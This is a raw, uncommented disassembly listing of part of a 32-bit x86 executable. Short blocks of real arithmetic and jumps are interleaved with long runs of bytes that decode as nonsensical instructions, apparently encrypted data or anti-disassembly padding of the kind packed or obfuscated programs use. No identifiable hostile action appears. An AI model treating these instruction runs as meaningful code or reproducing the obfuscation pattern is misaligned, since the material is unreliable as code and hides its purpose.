  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40dba9
  40db97:	repnz mov edi,0x18d25bb0
  40db9d:	sbb    dl,dl
  40db9f:	adc    al,0x18
  40dba1:	sbb    al,bl
  40dba3:	je     0x40db59
  40dba5:	xor    DWORD PTR [edi],edi
  40dba7:	retf   
  40dba8:	les    ebp,FWORD PTR [esi+edi*4+0x6f]
  40dbac:	bound  eax,QWORD PTR [ecx+0x11]
  40dbaf:	cmp    al,0x5d
  40dbb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbb2:	xchg   esp,eax
  40dbb3:	add    ch,cl
  40dbb5:	push   ds
  40dbb6:	retf   0xcaf0
  40dbb9:	test   eax,0x6108ca61
  40dbbe:	icebp  
  40dbbf:	ret    
  40dbc0:	out    0xce,eax
  40dbc2:	ret    
  40dbc3:	das    
  40dbc4:	test   al,0x53
  40dbc6:	cmp    al,0xac
  40dbc8:	and    al,0x2
  40dbca:	or     ch,BYTE PTR [esi]
  40dbcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbce:	popa   
  40dbcf:	fs push edx
  40dbd1:	scas   al,BYTE PTR es:[edi]
  40dbd2:	ret    0x4a3a
  40dbd5:	sub    BYTE PTR ds:0x3850e132,dh
  40dbdb:	dec    edi
  40dbdc:	aaa    
  40dbdd:	loope  0x40dba3
  40dbdf:	pop    ss
  40dbe0:	or     dl,BYTE PTR [edi-0x48e33fc1]
  40dbe6:	dec    ebp
  40dbe7:	push   eax
  40dbe8:	aam    0xec
  40dbea:	mov    DWORD PTR fs:[eax+0x2a],eax
  40dbee:	pop    eax
  40dbef:	mov    ds:0xb85b8fec,eax
  40dbf4:	mov    edx,0x5a6166e7
  40dbf9:	push   ebx
  40dbfa:	jge    0x40dc1a
  40dbfc:	loop   0x40dc71
  40dbfe:	adc    bh,BYTE PTR [ebx+0x35]
  40dc01:	or     eax,0xca0f6a9a
  40dc06:	add    eax,DWORD PTR [ebp-0x5e]
  40dc09:	pop    es
  40dc0a:	xor    esi,DWORD PTR [ebx+0xad30a60]
  40dc10:	sub    ch,BYTE PTR [esi+0x1cabd67f]
  40dc16:	mov    eax,ds:0xea1c2b89
  40dc1b:	(bad)  
  40dc1c:	into   
  40dc1d:	inc    eax
  40dc1e:	ret    0x3703
  40dc21:	(bad)  
  40dc22:	into   
  40dc23:	(bad)  
  40dc24:	cdq    
  40dc25:	(bad)  
  40dc26:	fdivr  DWORD PTR [edi]
  40dc28:	loope  0x40dc5a
  40dc2a:	retw   0x4672
  40dc2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc2f:	retf   
  40dc30:	jbe    0x40dbf1
  40dc32:	mov    esp,0x836b21f7
  40dc37:	push   esi
  40dc38:	xor    DWORD PTR [eax],ecx
  40dc3a:	pop    ecx
  40dc3b:	add    esi,DWORD PTR [edx-0x6e0c04ee]
  40dc41:	pop    ds
  40dc42:	js     0x40dc1d
  40dc44:	mov    ch,0xde
  40dc46:	jg     0x40dc44
  40dc48:	inc    edi
  40dc49:	adc    dh,BYTE PTR ds:[edx+0x5059457a]
  40dc50:	xor    ebp,DWORD PTR [eax+ebx*1+0x61]
  40dc54:	jne    0x40dc2a
  40dc56:	scas   al,BYTE PTR es:[edi]
  40dc57:	(bad)  
  40dc58:	fucom  st(5)
  40dc5a:	arpl   WORD PTR [ebx+0x75],dx
  40dc5d:	push   ebx
  40dc5e:	test   eax,0x2b0d3d02
  40dc63:	mov    al,ds:0x98da3d54
  40dc68:	mov    ds:0x48372b25,eax
  40dc6d:	in     eax,dx
  40dc6e:	pop    ebp
  40dc6f:	imul   edx,DWORD PTR [edi+0x65],0x23da2cd7
  40dc76:	jo     0x40dcbc
  40dc78:	outs   dx,DWORD PTR ds:[esi]
  40dc79:	cs (bad) 
  40dc7b:	bnd jge 0x40dca9
  40dc7e:	scas   al,BYTE PTR es:[edi]
  40dc7f:	icebp  
  40dc80:	sbb    al,0x16
  40dc82:	jno    0x40dca3
  40dc84:	inc    ebp
  40dc85:	xor    bh,0xb2
  40dc88:	add    al,0xc2
  40dc8a:	loope  0x40dce1
  40dc8c:	push   0x80dfde3e
  40dc91:	jae    0x40dcbc
  40dc93:	out    dx,al
  40dc94:	shl    BYTE PTR [esi+0x49cefb31],cl
  40dc9a:	fs mov ah,0x4a
  40dc9d:	and    ebx,DWORD PTR ds:0x87f1bcdc
  40dca3:	cmp    al,BYTE PTR [esi+eiz*4+0x768cfcbd]
  40dcaa:	cwde   
  40dcab:	sub    ecx,DWORD PTR [edx+0x108d9da0]
  40dcb1:	xor    DWORD PTR [ebx+ebp*4-0x5d],ecx
  40dcb5:	dec    esi
  40dcb6:	cld    
  40dcb7:	sub    cl,BYTE PTR [ecx+0x5d]
  40dcba:	cs aas 
  40dcbc:	or     al,dl
  40dcbe:	xchg   ecx,eax
  40dcbf:	retf   0xcbfa
  40dcc2:	cs das 
  40dcc4:	stc    
  40dcc5:	hlt    
  40dcc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcc7:	jmp    0x40dd25
  40dcc9:	data16 and BYTE PTR [edx],ah
  40dccc:	push   esi
  40dccd:	dec    edx
  40dcce:	pop    edx
  40dccf:	retf   0xb036
  40dcd2:	mov    dh,0x42
  40dcd4:	clc    
  40dcd5:	jne    0x40dd4b
  40dcd7:	les    edx,FWORD PTR [ebp+0x40df9d25]
  40dcdd:	mov    al,dh
  40dcdf:	dec    ebp
  40dce0:	fiadd  DWORD PTR [edx-0x564e19d3]
  40dce6:	addr16 dec edx
  40dce8:	cmp    eax,DWORD PTR [esi]
  40dcea:	and    esi,DWORD PTR [edi-0x2155b4f9]
  40dcf0:	adc    ecx,esp
  40dcf2:	ret    
  40dcf3:	fnclex 
  40dcf5:	lds    edi,FWORD PTR [edi+0x13]
  40dcf8:	xchg   eax,edi
  40dcfa:	mov    ds:0xb72a5510,eax
  40dcff:	add    esp,DWORD PTR [ebx-0x267cf903]
  40dd05:	adc    bl,BYTE PTR [edx-0x13]
  40dd08:	jbe    0x40dcd8
  40dd0a:	sahf   
  40dd0b:	pop    ecx
  40dd0c:	mov    edi,0x1a133181
  40dd11:	pop    edi
  40dd12:	jecxz  0x40dd64
  40dd14:	mov    ds:0xb08c5cb1,al
  40dd19:	mov    BYTE PTR [eax],0xa1
  40dd1c:	inc    dl
  40dd1e:	and    edi,DWORD PTR [edx-0x695992c7]
  40dd24:	mov    dh,0x53
  40dd26:	inc    edx
  40dd27:	pop    es
  40dd28:	pop    ecx
  40dd29:	(bad)  
  40dd2a:	and    eax,0x4c57562a
  40dd2f:	outs   dx,BYTE PTR ds:[esi]
  40dd30:	mov    ah,BYTE PTR [ecx+0x5d35c8aa]
  40dd36:	push   0xee4236a8
  40dd3b:	loopne 0x40dcfd
  40dd3d:	arpl   di,sp
  40dd3f:	push   edx
  40dd40:	aam    0x7a
  40dd42:	or     DWORD PTR [esi],esp
  40dd44:	fdiv   DWORD PTR [ecx-0x2db3ee34]
  40dd4a:	pushf  
  40dd4b:	out    0x95,eax
  40dd4d:	push   ebx
  40dd4e:	pop    eax
  40dd4f:	sbb    esp,ecx
  40dd51:	ret    
  40dd52:	mov    ah,0x6c
  40dd54:	les    eax,FWORD PTR [esi+eax*4-0x49]
  40dd58:	int3   
  40dd59:	out    dx,al
  40dd5a:	inc    esi
  40dd5b:	popf   
  40dd5c:	or     DWORD PTR [esi],0xc7ea1939
  40dd62:	sbb    BYTE PTR [ecx-0x5f55cd1],cl
  40dd68:	dec    esp
  40dd69:	jno    0x40dceb
  40dd6b:	ret    0x6087
  40dd6e:	in     eax,0xe6
  40dd70:	cmp    ah,BYTE PTR [eax+0x3]
  40dd73:	add    DWORD PTR [esi+0x3a],edi
  40dd76:	int    0xe0
  40dd78:	mov    ebp,edx
  40dd7a:	sbb    bl,BYTE PTR [edx-0x6c220e62]
  40dd80:	adc    ah,BYTE PTR [ecx]
  40dd82:	pop    edx
  40dd83:	adc    DWORD PTR [esi-0x3ea18f52],0x7b
  40dd8a:	call   0x2891eb1d
  40dd8f:	popa   
  40dd90:	xor    eax,0x4f3fb2cd
  40dd95:	in     eax,0xc3
  40dd97:	js     0x40dd7e
  40dd99:	pop    edi
  40dd9a:	lods   al,BYTE PTR ds:[esi]
  40dd9b:	inc    ecx
  40dd9c:	sbb    BYTE PTR [ebx-0x55e62b57],cl
  40dda2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dda3:	xchg   ecx,eax
  40dda4:	sbb    al,0x87
  40dda6:	or     ebp,esp
  40dda8:	inc    ebp
  40dda9:	in     eax,0xac
  40ddab:	pop    esi
  40ddac:	cmp    al,0x3
  40ddae:	mov    BYTE PTR [edx+0x7f],ah
  40ddb1:	repz inc edi
  40ddb3:	stc    
  40ddb4:	(bad)
  40ddb7:	push   ebx
  40ddb8:	dec    ebx
  40ddb9:	stos   DWORD PTR es:[edi],eax
  40ddba:	fstp   DWORD PTR [eax+0x78]
  40ddbd:	out    dx,al
  40ddbe:	in     eax,dx
  40ddbf:	pop    ecx
  40ddc0:	jno    0x40ddce
  40ddc2:	cdq    
  40ddc3:	adc    BYTE PTR [edi-0x1a22d4d5],ch
  40ddc9:	adc    DWORD PTR [esi+ebx*8-0x69],esp
  40ddcd:	push   edx
  40ddce:	in     al,0x10
  40ddd0:	xlat   BYTE PTR ds:[ebx]
  40ddd1:	cmp    BYTE PTR [ecx],al
  40ddd3:	ja     0x40dde8
  40ddd5:	xlat   BYTE PTR ds:[ebx]
  40ddd6:	lods   al,BYTE PTR ds:[esi]
  40ddd7:	loop   0x40dd99
  40ddd9:	jnp    0x40de1a
  40dddb:	loop   0x40dda5
  40dddd:	jbe    0x40de27
  40dddf:	(bad)  
  40dde0:	les    edx,FWORD PTR [edx]
  40dde2:	idiv   cl
  40dde4:	call   0x1bad:0xe609e6e6
  40ddeb:	imul   ebp,DWORD PTR [edi+ebx*1],0x122739f1
  40ddf2:	inc    esi
  40ddf3:	push   0x51
  40ddf5:	xchg   edi,eax
  40ddf6:	cmp    dh,BYTE PTR [edx*1-0x8615894]
  40ddfd:	sub    DWORD PTR [ebp+0x164c1709],ecx
  40de03:	repz mov eax,0x698f12c3
  40de09:	aas    
  40de0a:	push   0xcb418973
  40de0f:	leave  
  40de10:	cmc    
  40de11:	push   esi
  40de12:	dec    eax
  40de13:	ror    BYTE PTR [ebp+0x65],0x8f
  40de17:	adc    eax,0x8fe69304
  40de1c:	outs   dx,BYTE PTR ds:[esi]
  40de1d:	gs icebp 
  40de1f:	mov    ebp,0x10b9a06b
  40de24:	add    al,BYTE PTR [eax+0x29]
  40de27:	retf   0xfc4a
  40de2a:	out    dx,eax
  40de2b:	fstp   QWORD PTR [ecx-0x2268c79d]
  40de31:	(bad)  
  40de32:	popf   
  40de33:	jne    0x40de7c
  40de35:	or     eax,0x5ce9e0bb
  40de3a:	push   cs
  40de3b:	outs   dx,BYTE PTR ds:[esi]
  40de3c:	adc    DWORD PTR [esi-0x59],ebp
  40de3f:	gs mov ch,0x72
  40de42:	(bad)  
  40de43:	jmp    0xcece833c
  40de48:	test   eax,0x3adc45c7
  40de4d:	cmp    al,BYTE PTR [eax]
  40de4f:	add    bh,al
  40de51:	inc    ebp
  40de52:	in     al,dx
  40de53:	int    0x13
  40de55:	add    BYTE PTR [eax],al
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x422568
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40df41
  40deca:	inc    ecx
  40decb:	cmp    DWORD PTR [esp+edx*1-0x34],0x18
  40ded0:	sbb    dl,dl
  40ded2:	adc    al,0x18
  40ded4:	sbb    BYTE PTR [esi-0x45],al
  40ded7:	ret    
  40ded8:	fimul  WORD PTR [eax-0x7da5109e]
  40dede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dedf:	pminsw mm3,QWORD PTR [eax]
  40dee2:	mov    ds:0x868686f8,eax
  40dee7:	dec    ecx
  40dee8:	sbb    DWORD PTR [ebx+esi*1],esp
  40deeb:	pop    edi
  40deec:	mov    edi,0xa025b8fa
  40def1:	js     0x40de73
  40def3:	outs   dx,DWORD PTR ds:[esi]
  40def4:	push   ebp
  40def5:	imul   esi,DWORD PTR [ebp+0x58e792c],0x39261b83
  40deff:	xor    BYTE PTR [ebx+edi*8-0x19],bl
  40df03:	pop    ebx
  40df04:	xchg   dh,ah
  40df06:	sub    eax,0xab9df1cd
  40df0b:	adc    eax,0xf33f3eca
  40df10:	sbb    cl,al
  40df12:	jno    0x40df89
  40df14:	aad    0x17
  40df16:	cmp    eax,0x70318951
  40df1b:	and    edi,ebp
  40df1d:	or     eax,0xb2344ab0
  40df22:	push   cs
  40df23:	jmp    0x40ded5
  40df25:	test   al,0xb3
  40df27:	cmp    edi,DWORD PTR [edi+0x38]
  40df2a:	cdq    
  40df2b:	cdq    
  40df2c:	and    eax,esi
  40df2e:	xchg   ecx,eax
  40df2f:	stos   BYTE PTR es:[edi],al
  40df30:	js     0x40df04
  40df32:	sbb    al,0x11
  40df34:	jae    0x40df49
  40df36:	pop    edi
  40df37:	mov    cl,0x60
  40df39:	(bad)  
  40df3a:	push   0x9045298b
  40df3f:	cld    
  40df40:	jp     0x40df4e
  40df42:	add    BYTE PTR [edi-0x63],bl
  40df45:	xchg   DWORD PTR [ebp+ecx*1-0x2c],edx
  40df49:	jl     0x40defe
  40df4b:	fistp  QWORD PTR [ecx+0x52a55d06]
  40df51:	or     bh,BYTE PTR [edx-0x21adf10f]
  40df57:	into   
  40df58:	and    BYTE PTR [ecx],0x80
  40df5b:	nop
  40df5c:	pop    eax
  40df5d:	pushf  
  40df5e:	sbb    ecx,ebx
  40df60:	pusha  
  40df61:	ret    
  40df62:	mov    eax,0xa32b87be
  40df67:	jns    0x40dfa3
  40df69:	rcl    DWORD PTR [ebx+ebp*1],1
  40df6c:	mov    eax,ds:0x50efa019
  40df71:	pushf  
  40df72:	jne    0x40df26
  40df74:	nop
  40df75:	mov    ecx,DWORD PTR ds:0xab14953c
  40df7b:	retf   
  40df7c:	and    edi,DWORD PTR [esi]
  40df7e:	cmc    
  40df7f:	jbe    0x40dfc8
  40df81:	mov    eax,0xe98c94fb
  40df86:	or     ch,BYTE PTR [esi-0x7895bb9a]
  40df8c:	(bad)  
  40df8d:	push   eax
  40df8e:	cmp    al,0x45
  40df90:	call   0x67bf:0x4729e8ff
  40df97:	or     eax,0x34159bdc
  40df9c:	nop
  40df9d:	fwait
  40df9e:	or     ecx,eax
  40dfa0:	loopne 0x40df84
  40dfa2:	loopne 0x40df90
  40dfa4:	mov    DWORD PTR [eax+edi*1-0x4f],edi
  40dfa8:	sahf   
  40dfa9:	and    eax,0xb689ffb
  40dfae:	xor    DWORD PTR [ecx+0x2071d73e],esi
  40dfb4:	gs jmp 0x33df7be3
  40dfba:	push   ecx
  40dfbb:	inc    ebp
  40dfbc:	nop
  40dfbd:	arpl   WORD PTR [ebp+0x32ac0cad],cx
  40dfc3:	or     BYTE PTR [ebp*4+0x1d22ced1],dl
  40dfca:	cli    
  40dfcb:	sbb    cl,ah
  40dfcd:	and    ebp,DWORD PTR [edi+0x6b]
  40dfd0:	dec    ebp
  40dfd1:	lds    eax,FWORD PTR [eax]
  40dfd3:	es cs mov ebp,0x8e877e3a
  40dfda:	jmp    0xcc7f:0xbc311a8b
  40dfe1:	dec    esp
  40dfe2:	fs xchg edi,eax
  40dfe4:	neg    BYTE PTR [eax+0x3e]
  40dfe7:	pop    ds
  40dfe8:	test   DWORD PTR [eax+0x50],ebp
  40dfeb:	jle    0x40df91
  40dfed:	aam    0x76
  40dfef:	sbb    al,0xe4
  40dff1:	arpl   sp,bx
  40dff3:	fdiv   DWORD PTR [esi+0x6d]
  40dff6:	adc    al,0x21
  40dff8:	push   cs
  40dff9:	pop    ds
  40dffa:	idiv   cl
  40dffc:	clc    
  40dffd:	push   ds
  40dffe:	ins    BYTE PTR es:[edi],dx
  40dfff:	or     al,0x87
  40e001:	outs   dx,DWORD PTR ds:[esi]
  40e002:	jp     0x40e015
  40e004:	outs   dx,BYTE PTR ds:[esi]
  40e005:	scas   al,BYTE PTR es:[edi]
  40e006:	les    edi,FWORD PTR [esi]
  40e008:	inc    ecx
  40e009:	aaa    
  40e00a:	repnz sar DWORD PTR [ebx-0x68],cl
  40e00e:	ins    DWORD PTR es:[edi],dx
  40e00f:	mov    DWORD PTR [edx-0x49],edx
  40e012:	jo     0x40e03a
  40e014:	div    DWORD PTR [ebx+0x51]
  40e017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e018:	pop    DWORD PTR [ecx+0x6]
  40e01b:	das    
  40e01c:	retf   0xba38
  40e01f:	shl    esp,cl
  40e021:	pop    es
  40e022:	sub    eax,0xa09d3a36
  40e027:	xor    DWORD PTR [edx+0x700a43ef],ebx
  40e02d:	or     bh,dl
  40e02f:	arpl   si,sp
  40e031:	loop   0x40e01b
  40e033:	mov    WORD PTR [edi],ss
  40e035:	fisttp DWORD PTR [edx+0x1f]
  40e038:	add    al,0x7d
  40e03a:	cmp    BYTE PTR [ebx-0x32],0xac
  40e03e:	out    0xe,al
  40e040:	cli    
  40e041:	call   FWORD PTR [ebx]
  40e043:	mov    ds:0xd15a99cf,al
  40e048:	and    ebx,edx
  40e04a:	or     ecx,DWORD PTR [ebp+0x402975b0]
  40e050:	pop    ds
  40e051:	cmp    DWORD PTR [di-0x5c],esi
  40e055:	daa    
  40e056:	push   ebp
  40e057:	ja     0x40e01a
  40e059:	xor    DWORD PTR [esp+esi*4+0x60e8a9a4],edx
  40e060:	(bad)  
  40e061:	mov    ecx,0xb09a4d63
  40e066:	push   edx
  40e067:	sub    BYTE PTR [ebx-0x75],al
  40e06a:	out    0x29,eax
  40e06c:	xchg   ebp,eax
  40e06d:	loopne 0x40e00e
  40e06f:	ss jno 0x40dffa
  40e072:	fmul   DWORD PTR [ebx-0x7f]
  40e075:	rol    ebp,0xfc
  40e078:	sbb    eax,0x4921486b
  40e07d:	sar    BYTE PTR [eax],cl
  40e07f:	cmp    al,0x6
  40e081:	loope  0x40e0e7
  40e083:	and    eax,edi
  40e085:	mov    eax,ds:0x9d3da96d
  40e08a:	test   BYTE PTR [edx],cl
  40e08c:	pop    eax
  40e08d:	mov    ecx,0xb3fd0282
  40e092:	jp     0x40e052
  40e094:	bound  esp,QWORD PTR ds:0xc7461dc3
  40e09a:	mov    esi,0x706e723e
  40e09f:	jb     0x40e0e1
  40e0a1:	or     BYTE PTR [eax],0xf6
  40e0a4:	mov    ecx,0xb511eea6
  40e0a9:	push   ebx
  40e0aa:	sbb    esi,DWORD PTR [eax]
  40e0ac:	imul   ebp,DWORD PTR [eax+0x25],0x15a70d79
  40e0b3:	mov    cl,0xf
  40e0b5:	mov    ebx,0xee3ed30c
  40e0ba:	cmc    
  40e0bb:	sub    esi,ebx
  40e0bd:	sub    bl,BYTE PTR [esi-0x671f0b4b]
  40e0c3:	in     al,0x5e
  40e0c5:	std    
  40e0c6:	out    0xd3,al
  40e0c8:	cmp    eax,0xbc6af7e0
  40e0cd:	or     esi,DWORD PTR [edx]
  40e0cf:	mov    ch,0xe
  40e0d1:	push   ebx
  40e0d2:	ins    DWORD PTR es:[edi],dx
  40e0d3:	out    dx,eax
  40e0d4:	push   edx
  40e0d5:	adc    edi,ecx
  40e0d7:	jns    0x40e12f
  40e0d9:	dec    ebx
  40e0da:	retf   0x7a24
  40e0dd:	jo     0x40e13a
  40e0df:	or     edx,DWORD PTR [esi-0x70]
  40e0e2:	push   edx
  40e0e3:	fdiv   st,st(6)
  40e0e5:	in     eax,0x37
  40e0e7:	inc    edi
  40e0e8:	jno    0x40e0c4
  40e0ea:	jg     0x40e131
  40e0ec:	cs push es
  40e0ee:	sub    dh,BYTE PTR [ebp+ebx*4-0x34]
  40e0f2:	sbb    DWORD PTR [esp+edi*8-0x30],ecx
  40e0f6:	loope  0x40e08e
  40e0f8:	lds    ebx,FWORD PTR [ebp+0x6d14af4]
  40e0fe:	xor    eax,DWORD PTR [ebp+0x3e3c89ee]
  40e104:	sbb    al,0x9b
  40e106:	inc    eax
  40e107:	dec    ebp
  40e108:	sbb    ecx,DWORD PTR [edi-0x3aebaac4]
  40e10e:	dec    ebx
  40e10f:	jmp    0x66a7e056
  40e114:	les    ebp,FWORD PTR [edi-0x2643cd06]
  40e11a:	xor    dl,BYTE PTR [ecx-0x3bcce69b]
  40e120:	jne    0x40e122
  40e122:	fiadd  DWORD PTR ds:0x9529ed74
  40e128:	cli    
  40e129:	shl    BYTE PTR [eax+eax*1+0x50],1
  40e12d:	or     DWORD PTR [ebp-0x5729bf9a],0x4a
  40e134:	sub    al,BYTE PTR [edi-0x28]
  40e137:	mov    ecx,0x2e495dc9
  40e13c:	xchg   dh,ch
  40e13e:	jg     0x40e0d8
  40e140:	repz and al,0xc8
  40e143:	sub    dh,BYTE PTR [esi+eiz*8-0x5e]
  40e147:	inc    esp
  40e148:	sbb    DWORD PTR [edi-0x5b],ebx
  40e14b:	mov    dh,0x73
  40e14d:	xor    DWORD PTR [esi-0x1],eax
  40e150:	repz (bad) 
  40e152:	fucomi st,st(5)
  40e154:	test   DWORD PTR [ecx-0x6a],0xea2721be
  40e15b:	mov    esi,0x3fc4535a
  40e160:	in     al,dx
  40e161:	fcom   QWORD PTR [eax]
  40e163:	mov    BYTE PTR ds:0x1a21a4fa,bh
  40e169:	inc    esi
  40e16a:	jge    0x40e110
  40e16c:	xchg   edi,eax
  40e16d:	rol    BYTE PTR [esi+0x3abb4ec0],cl
  40e173:	test   BYTE PTR ds:0x4a9073a3,dl
  40e179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e17a:	or     DWORD PTR [ebp-0x75],edx
  40e17d:	inc    ebp
  40e17e:	lock xor eax,0xffffe1ce
  40e184:	add    eax,DWORD PTR [ebp-0xc]
  40e187:	jmp    0x40e44b
  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e20b
  40e199:	adc    BYTE PTR [ebp-0x56],0xce
  40e19d:	enter  0x1818,0xd2
  40e1a1:	adc    al,0x18
  40e1a3:	sbb    BYTE PTR [eax-0x4a],bl
  40e1a6:	jmp    DWORD PTR [edi]
  40e1a8:	push   edi
  40e1a9:	(bad)  
  40e1aa:	mov    esi,0x3ee5225c
  40e1af:	push   edx
  40e1b0:	pusha  
  40e1b1:	je     0x40e197
  40e1b3:	stc    
  40e1b4:	sbb    BYTE PTR [esi],0x6b
  40e1b7:	(bad)  
  40e1b8:	cld    
  40e1b9:	mov    cl,0x37
  40e1bb:	ins    DWORD PTR es:[edi],dx
  40e1bc:	inc    DWORD PTR [ecx+0x19]
  40e1bf:	and    eax,0x87a08784
  40e1c4:	ins    DWORD PTR es:[edi],dx
  40e1c5:	loop   0x40e1e3
  40e1c7:	xchg   ebx,eax
  40e1c8:	adc    al,0xf
  40e1ca:	and    esi,DWORD PTR [ecx-0x6b]
  40e1cd:	lods   al,BYTE PTR ds:[esi]
  40e1ce:	dec    edx
  40e1cf:	sub    dh,dh
  40e1d1:	jg     0x40e245
  40e1d3:	or     dl,ah
  40e1d5:	mov    esp,0x1ead7198
  40e1da:	add    ah,cl
  40e1dc:	(bad)  
  40e1dd:	pushf  
  40e1de:	outs   dx,BYTE PTR ds:[esi]
  40e1df:	xor    BYTE PTR [ebx+0x4fca496a],ch
  40e1e5:	xor    edx,DWORD PTR [edi+0x7e]
  40e1e8:	int3   
  40e1e9:	shl    DWORD PTR [edx-0x37],0x8e
  40e1ed:	jbe    0x40e1ed
  40e1ef:	mov    ch,0xc8
  40e1f1:	mov    ds:0x8d46c252,eax
  40e1f6:	add    al,0xa8
  40e1f8:	daa    
  40e1f9:	xor    bh,dh
  40e1fb:	ror    DWORD PTR [ebx],cl
  40e1fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1fe:	pop    eax
  40e1ff:	mov    bl,0xa3
  40e201:	(bad)  
  40e202:	mov    ebp,DWORD PTR [eax+0x59]
  40e205:	inc    ebx
  40e206:	sbb    eax,0x889959db
  40e20b:	xchg   edx,eax
  40e20c:	jecxz  0x40e253
  40e20e:	dec    sp
  40e210:	fst    DWORD PTR [ebx-0x71]
  40e213:	stc    
  40e214:	scas   al,BYTE PTR es:[edi]
  40e215:	jno    0x40e254
  40e217:	sbb    ebx,DWORD PTR [ebx+0x32]
  40e21a:	inc    esp
  40e21b:	mov    ebp,db0
  40e21e:	loope  0x40e211
  40e220:	mov    bl,0xc2
  40e222:	and    DWORD PTR [ebp+0x3e10bb09],esi
  40e228:	jge    0x40e246
  40e22a:	push   esp
  40e22b:	mov    esi,DWORD PTR [eax-0x4b]
  40e22e:	inc    eax
  40e22f:	cmp    eax,0x4106b363
  40e234:	shl    BYTE PTR [ecx],cl
  40e236:	popf   
  40e237:	dec    ax
  40e239:	sbb    cl,cl
  40e23b:	and    al,0x7f
  40e23d:	inc    esp
  40e23e:	mov    dl,0xf4
  40e240:	push   0xb0781a5c
  40e245:	mov    dh,0x4c
  40e247:	ds push esp
  40e249:	imul   ebp,ecx,0xfd85f1f7
  40e24f:	sub    BYTE PTR [edx+edi*2],ch
  40e252:	iret   
  40e253:	inc    edx
  40e254:	fs mov edi,0xea841feb
  40e25a:	rcr    DWORD PTR [edi+0x3cfa4da2],1
  40e260:	sbb    ecx,DWORD PTR [edx+0x329b07b]
  40e266:	shl    BYTE PTR [eiz*8-0x442ac743],cl
  40e26d:	inc    eax
  40e26e:	jle    0x40e287
  40e270:	mov    esp,0xad2a455e
  40e275:	(bad)  
  40e276:	mov    gs,WORD PTR [eax]
  40e278:	(bad)  
  40e279:	popf   
  40e27a:	unpcklps xmm5,XMMWORD PTR [ecx]
  40e27d:	hlt    
  40e27e:	loopne 0x40e204
  40e280:	mov    al,0x47
  40e282:	call   0x803791e9
  40e287:	rcl    edx,1
  40e289:	cmp    bh,BYTE PTR [ecx+0xe]
  40e28c:	imul   edi,DWORD PTR [edi+0x3f],0xffffffa0
  40e290:	ret    0x7aae
  40e293:	(bad)  
  40e294:	call   0x7949:0x226ee5b3
  40e29b:	xchg   ebx,eax
  40e29c:	jmp    0x52fa:0x8b72857f
  40e2a3:	(bad)  
  40e2a4:	sti    
  40e2a5:	out    0x9b,al
  40e2a7:	jge    0x40e292
  40e2a9:	into   
  40e2aa:	xchg   ebp,eax
  40e2ab:	pop    edi
  40e2ac:	mov    ebx,0xf4443ddf
  40e2b1:	int3   
  40e2b2:	cld    
  40e2b3:	fiadd  DWORD PTR [edx-0x45]
  40e2b6:	xlat   BYTE PTR ds:[ebx]
  40e2b7:	sub    cl,BYTE PTR [edx-0x9]
  40e2ba:	mov    eax,0xd335596e
  40e2bf:	adc    BYTE PTR [eax+0x44],ch
  40e2c2:	or     ah,bh
  40e2c4:	aas    
  40e2c5:	sbb    al,0x90
  40e2c7:	sub    bl,BYTE PTR [ecx-0x2b]
  40e2ca:	icebp  
  40e2cb:	adc    BYTE PTR [eax+0x6a],ch
  40e2ce:	jge    0x40e2c1
  40e2d0:	mov    ch,0x39
  40e2d2:	jle    0x40e2e5
  40e2d4:	jmp    0x4ca7:0x18140e26
  40e2db:	and    BYTE PTR [ecx+0x71],ah
  40e2de:	(bad)  
  40e2df:	loope  0x40e2e9
  40e2e1:	jmp    0xd5ea:0x65cc267d
  40e2e8:	dec    BYTE PTR [edx+0x1a]
